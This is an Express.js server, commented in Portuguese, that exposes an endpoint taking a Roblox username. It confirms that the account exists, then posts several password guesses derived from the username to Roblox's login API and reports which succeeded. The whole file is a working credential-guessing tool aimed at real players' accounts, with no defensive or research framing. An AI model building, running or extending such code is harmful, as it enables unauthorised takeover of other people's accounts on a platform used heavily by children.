const express = require('express');
const axios = require('axios');
const app = express();
app.use(express.json());

// Configuração de cookies/headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Função para testar senhas
async function testPasswords(username) {
    // Gerar combinações de senha
    const passwordAttempts = [
        username.slice(0, 4),
        username.slice(4),
        username.slice(0, 2) + username.slice(-2)
    ];

    // Testar senhas em paralelo
    const promises = passwordAttempts.map(async (password) => {
        try {
            const response = await axios.post(
                'https://auth.roblox.com/v2/login',
                { username, password },
                { 
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 5000
                }
            );
            return { password, success: true };
        } catch (error) {
            return { password, success: false, error: error.message };
        }
    });

    return Promise.all(promises);
}

// Rota principal
app.post('/api/check', async (req, res) => {
    const { username } = req.body;
    
    try {
        // Obter dados do usuário
        const userData = await axios.get(
            `https://api.roblox.com/users/get-by-username?username=${username}`
        );
        
        if (userData.data.Id) {
            // Testar senhas em threads
            const results = await testPasswords(username);
            res.json({ success: true, results });
        } else {
            res.json({ success: false, message: 'Usuário não encontrado' });
        }
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

app.listen(process.env.PORT || 3000);
